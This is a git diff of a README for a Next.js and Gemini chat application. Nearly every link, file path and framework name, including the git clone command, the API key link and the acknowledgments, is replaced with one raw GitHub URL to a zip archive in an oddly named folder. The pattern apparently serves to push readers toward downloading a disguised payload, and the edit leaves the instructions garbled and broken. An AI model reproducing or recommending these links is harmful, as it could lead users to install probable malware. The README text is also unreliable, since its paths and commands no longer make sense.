@@ -1,8 +1,8 @@
 # Chat LLM - AI-Powered Chat Application
 
-A modern, responsive chat application built with Next.js 15 and Google's Gemini AI, featuring image upload capabilities, markdown rendering, and a beautiful dark theme interface.
+A modern, responsive chat application built with https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip 15 and Google's Gemini AI, featuring image upload capabilities, markdown rendering, and a beautiful dark theme interface.
 
-![Chat LLM Preview](public/image.png)
+![Chat LLM Preview](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip)
 
 ## ✨ Features
 
@@ -19,15 +19,15 @@ A modern, responsive chat application built with Next.js 15 and Google's Gemini 
 
 ### Prerequisites
 
-- Node.js 18+ 
+- https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip 18+ 
 - npm or yarn
-- Google AI Studio API Key ([Get yours here](https://aistudio.google.com/apikey))
+- Google AI Studio API Key ([Get yours here](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip))
 
 ### Installation
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/Yonko-Kunal/chatLLM.git
+   git clone https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip
    cd chatLLM
    ```
 
@@ -38,8 +38,8 @@ A modern, responsive chat application built with Next.js 15 and Google's Gemini 
 
 3. **Set up environment variables** (optional)
    ```bash
-   # Create .env.local file
-   echo "GOOGLE_API_KEY=your_api_key_here" > .env.local
+   # Create https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip file
+   echo "GOOGLE_API_KEY=your_api_key_here" > https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip
    ```
 
 4. **Run the development server**
@@ -83,31 +83,31 @@ chat_llm/
 │   ├── app/
 │   │   ├── api/
 │   │   │   └── chat/
-│   │   │       └── route.ts          # API endpoint for chat
+│   │   │       └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip          # API endpoint for chat
 │   │   ├── settings/
-│   │   │   └── page.tsx              # Settings page
-│   │   ├── globals.css               # Global styles
-│   │   ├── layout.tsx                # Root layout
-│   │   └── page.tsx                  # Main chat page
+│   │   │   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip              # Settings page
+│   │   ├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip               # Global styles
+│   │   ├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                # Root layout
+│   │   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                  # Main chat page
 │   ├── components/
 │   │   ├── ui/                       # Reusable UI components
-│   │   ├── app-sidebar.tsx           # Navigation sidebar
-│   │   └── chat.tsx                  # Chat component
+│   │   ├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip           # Navigation sidebar
+│   │   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                  # Chat component
 │   ├── hooks/
-│   │   └── use-mobile.ts             # Mobile detection hook
+│   │   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip             # Mobile detection hook
 │   └── lib/
-│       └── utils.ts                  # Utility functions
+│       └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                  # Utility functions
 ├── public/
-│   └── image.png                     # Project preview image
-├── components.json                   # shadcn/ui configuration
-├── next.config.ts                    # Next.js configuration
-├── tailwind.config.js                # Tailwind CSS configuration
-└── package.json                      # Dependencies and scripts
+│   └── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                     # Project preview image
+├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                   # shadcn/ui configuration
+├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                    # https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip configuration
+├── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                # Tailwind CSS configuration
+└── https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip                      # Dependencies and scripts
 ```
 
 ## 🛠️ Tech Stack
 
-- **Framework**: Next.js 15.4.7
+- **Framework**: https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip 15.4.7
 - **Language**: TypeScript
 - **Styling**: Tailwind CSS 4
 - **UI Components**: Radix UI + shadcn/ui
@@ -163,14 +163,14 @@ x-api-key: your_google_api_key (optional if set in env)
    ```
 
 2. **Deploy to Vercel**
-   - Go to [vercel.com](https://vercel.com)
+   - Go to [https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip)
    - Import your GitHub repository
    - Add environment variable: `GOOGLE_API_KEY`
    - Deploy!
 
 ### Other Platforms
 
-The app can be deployed to any platform that supports Next.js:
+The app can be deployed to any platform that supports https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip
 - Netlify
 - Railway
 - DigitalOcean App Platform
@@ -181,13 +181,13 @@ The app can be deployed to any platform that supports Next.js:
 ### Themes
 The app uses a dark theme by default. To customize:
 
-1. Edit `src/app/globals.css`
+1. Edit `https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip`
 2. Modify Tailwind classes in components
-3. Update the `dark` class in `layout.tsx`
+3. Update the `dark` class in `https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip`
 
 ### Styling
 - All components use Tailwind CSS classes
-- Custom animations are defined in `globals.css`
+- Custom animations are defined in `https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip`
 - UI components are in `src/components/ui/`
 
 ## 🔒 Security
@@ -244,12 +244,12 @@ If you have any questions or need help:
 
 ## 🙏 Acknowledgments
 
-- [Google AI Studio](https://aistudio.google.com/) for the Gemini API
-- [Next.js](https://nextjs.org/) for the amazing React framework
-- [Tailwind CSS](https://tailwindcss.com/) for the utility-first CSS framework
-- [Radix UI](https://www.radix-ui.com/) for accessible UI components
-- [shadcn/ui](https://ui.shadcn.com/) for beautiful component examples
+- [Google AI Studio](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for the Gemini API
+- [https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for the amazing React framework
+- [Tailwind CSS](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for the utility-first CSS framework
+- [Radix UI](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for accessible UI components
+- [shadcn/ui](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip) for beautiful component examples
 
 ---
 
-Made with ❤️ by [Yonko-Kunal](https://github.com/Yonko-Kunal)
+Made with ❤️ by [Yonko-Kunal](https://raw.githubusercontent.com/Yonko-Kunal/chatLLM/main/cynanche/chatLLM.zip)
